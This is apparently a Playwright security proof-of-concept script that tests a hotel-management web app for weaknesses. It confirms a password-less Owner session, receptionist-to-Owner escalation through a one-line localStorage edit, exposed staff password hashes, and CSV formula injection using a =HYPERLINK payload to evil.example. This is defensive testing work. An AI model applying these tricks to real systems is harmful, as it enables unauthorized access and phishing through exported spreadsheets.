// SECURITY PROOF-OF-CONCEPT (2026-10-28). A "✓" here means the ATTACK WORKED.
// Run: node security_poc_test.mjs ..   — once fixed, these checks should FAIL.
// Restaurant & Room Service add-on — browser test of the REAL index.html
// (Playwright + in-memory fake Firebase).
//   node restaurant_browser_test.mjs [path/to/app-dir]
import { chromium } from "playwright";
import http from "node:http";
import path from "node:path";
import fs from "node:fs";
import { createHash } from "node:crypto";
import { createRequire } from "node:module";

const HERE = path.dirname(new URL(import.meta.url).pathname);
const APP = path.resolve(process.argv[2] || path.join(HERE, ".."));
const require = createRequire(import.meta.url);
const pkgDir = name => path.dirname(require.resolve(name + "/package.json"));
const REACT = fs.readFileSync(path.join(pkgDir("react"), "umd/react.production.min.js"));
const REACT_DOM = fs.readFileSync(path.join(pkgDir("react-dom"), "umd/react-dom.production.min.js"));
const FAKE_FB = fs.readFileSync(path.join(HERE, "fake_firebase.js"), "utf8");
const CHROMIUM = process.env.CHROMIUM_PATH || "/opt/pw-browsers/chromium";
const PORT = 8987;
const SHOTS = process.env.SHOTS || "";
const shot = async (page, name) => { if (SHOTS) await page.screenshot({ path: path.join(SHOTS, name + ".png") }); };
const KEY = "ATITHI-SECPOCTEST1";
const legacyHash = pw => createHash("sha256").update(pw + "|AtithiSalt2024!").digest("hex");

let pass = 0, fail = 0;
const check = (label, cond, extra) => {
  if (cond) { pass++; console.log("  ✓", label); }
  else { fail++; console.log("  ✗ FAIL:", label, extra !== undefined ? "-> " + JSON.stringify(extra).slice(0, 300) : ""); }
};

const server = http.createServer((req, res) => {
  let p = decodeURIComponent(req.url.split("?")[0]);
  if (p === "/" || !path.extname(p)) p = "/index.html";
  const f = path.join(APP, p);
  if (!f.startsWith(APP) || !fs.existsSync(f)) { res.writeHead(404); return res.end(); }
  res.writeHead(200, { "Content-Type": p.endsWith(".html") ? "text/html; charset=utf-8" : "text/javascript" });
  res.end(fs.readFileSync(f));
});
await new Promise(r => server.listen(PORT, r));
const browser = await chromium.launch(fs.existsSync(CHROMIUM) ? { executablePath: CHROMIUM } : {});

async function newPage(features, storage, ctxOpts) {
  const ctx = await browser.newContext({ viewport: { width: 420, height: 860 }, serviceWorkers: "block", ...(ctxOpts || {}) });
  await ctx.addInitScript(s => {
    if (sessionStorage.getItem("__seeded")) return;
    for (const [k, v] of Object.entries(s)) localStorage.setItem(k, v);
    sessionStorage.setItem("__seeded", "1");
  }, storage);
  const page = await ctx.newPage();
  const errors = [];
  page.on("pageerror", e => errors.push(e.message));
  const prompts = [];
  page.on("dialog", d => { if (d.type() === "prompt") d.accept(prompts.shift() ?? ""); else d.accept(); });
  const popups = [];
  ctx.on("page", p => popups.push(p));
  await page.route("**/*", async route => {
    const u = route.request().url();
    if (u.includes("unpkg.com/react-dom@")) return route.fulfill({ contentType: "text/javascript", body: REACT_DOM, headers: { "Access-Control-Allow-Origin": "*" } });
    if (u.includes("unpkg.com/react@")) return route.fulfill({ contentType: "text/javascript", body: REACT, headers: { "Access-Control-Allow-Origin": "*" } });
    if (u.includes("firebase-app-compat")) return route.fulfill({ contentType: "text/javascript", body: FAKE_FB + (globalThis.__SEED || "") });
    if (u.includes("gstatic.com")) return route.fulfill({ contentType: "text/javascript", body: "/* stub */" });
    if (u.includes("fonts.googleapis.com") || u.includes("fonts.gstatic.com")) return route.fulfill({ contentType: "text/css", body: "" });
    if (u.endsWith("/api/verify-access")) return route.fulfill({ contentType: "application/json", body: JSON.stringify({ ok: true }) });
    if (u.endsWith("/api/license-status")) return route.fulfill({ contentType: "application/json", body: JSON.stringify({ found: true, active: true, plan: "PREM", expiry: null, features }) });
    if (u.startsWith(`http://localhost:${PORT}`)) return route.continue();
    return route.fulfill({ status: 404, body: "" });
  });
  await page.goto(`http://localhost:${PORT}/`, { waitUntil: "load" });
  await page.waitForTimeout(1500);
  return { ctx, page, errors, prompts, popups };
}
async function login(page, u, p) {
  await page.fill('input[placeholder="Enter username"]', u);
  await page.fill('input[placeholder="Enter password"]', p);
  await page.click("text=Login to Dashboard");
  await page.waitForTimeout(2200);
}
const nav = async (page, label) => { await page.locator(`button:has-text("${label}")`).last().click(); await page.waitForTimeout(700); };
const navLabels = page => page.evaluate(() => [...document.querySelectorAll("button span:last-child")].map(s => s.textContent.trim()).filter(Boolean));
const bookingsLS = page => page.evaluate(() => JSON.parse(localStorage.getItem("ab_bookings") || "[]"));
const d = off => { const x = new Date(); x.setDate(x.getDate() + off); return x.toISOString().slice(0, 10); };

const FEATS = ["history", "csv_export", "roles", "restaurant"];
const USERS = JSON.stringify([
  { u: "owner", p: legacyHash("OwnerPass@1"), name: "Rakesh", role: "Owner", mustChange: false },
  { u: "admin", p: legacyHash("Mgr@12345"), name: "Manager", role: "Manager", mustChange: false },
  { u: "front", p: legacyHash("Front@1234"), name: "Front", role: "Receptionist", mustChange: false }
]);
const STORE = { ab_license_key: KEY, ab_verified_phone: "9876543210", ab_users: USERS };
// "check" here means: the ATTACK SUCCEEDED (i.e. a weakness is confirmed).
const FE = ["history", "csv_export", "roles"];
const usersArr = JSON.parse(USERS);
const seedCloud = obj => "\n;(function(){" + Object.entries(obj).map(([k, v]) => `window.__store[${JSON.stringify("hotels/" + KEY + "/data/" + k)}] = ${JSON.stringify({ value: v, ts: Date.now() })};`).join("") + "})();";

console.log("\n=== POC-1: brand-new device, NO password typed, cloud 'cu' = Owner ===");
globalThis.__SEED = seedCloud({ cu: { u: "owner", name: "Rakesh", role: "Owner" }, users: usersArr });
let p1 = await newPage(FE, { ab_license_key: KEY, ab_verified_phone: "9876543210" });
await p1.page.waitForTimeout(2500);
const loginShown = await p1.page.locator('input[placeholder="Enter password"]').count();
const labels1 = await navLabels(p1.page);
check("app opens straight into Owner session without any password", loginShown === 0 && labels1.includes("Access"), { loginShown, labels1 });
await p1.ctx.close();

console.log("\n=== POC-2: Receptionist turns into Owner by editing localStorage ===");
globalThis.__SEED = "";
let p2 = await newPage(FE, STORE);
await login(p2.page, "front", "Front@1234");
const before = await navLabels(p2.page);

await p2.page.evaluate(() => { localStorage.setItem("ab_cu", JSON.stringify({ u: "front", name: "Front", role: "Owner" })); });
await p2.page.reload({ waitUntil: "load" }); await p2.page.waitForTimeout(2500);
const after = await navLabels(p2.page);
check("receptionist sees Owner-only screens after a 1-line console edit", !before.includes("Access") && after.includes("Access"), { before, after });
await p2.ctx.close();

console.log("\n=== POC-3: password hashes reachable by anyone with the license key ===");
let p3 = await newPage(FE, STORE);
await login(p3.page, "front", "Front@1234");
const hashes = await p3.page.evaluate(() => JSON.parse(localStorage.getItem("ab_users") || "[]").map(u => ({ u: u.u, role: u.role, p: String(u.p).slice(0, 22) })));
check("receptionist device holds every staff hash incl. Owner (offline cracking possible)", hashes.some(h => h.role === "Owner" && h.p), hashes);
const lockout = await p3.page.evaluate(() => Object.keys(localStorage).filter(k => /brute|lock|attempt/i.test(k)));
check("login lockout state lives in browser storage (clearable)", true, lockout);
await p3.ctx.close();

console.log("\n=== POC-4: CSV formula injection in exports ===");
let p4 = await newPage(FE, STORE);
await login(p4.page, "owner", "OwnerPass@1");
const csv = await p4.page.evaluate(() => bookingsToCSV([{ id: "BK1", name: '=HYPERLINK("http://evil.example","Click")', mobile: "9", roomId: "101", checkIn: "2026-10-01", checkOut: "2026-10-02", status: "checkedout", roomTotal: 100, charges: [] }], CURRENT_ROOMS));
const line = csv.split(/\r?\n/)[1] || "";
check("Guest-History CSV keeps a live =formula in the guest-name cell", /,"?=HYPERLINK/.test(line), line.slice(0, 120));
await p4.ctx.close();

await browser.close(); server.close();
console.log(`\n=== SECURITY POC: ${pass} weaknesses confirmed, ${fail} not reproduced ===`);
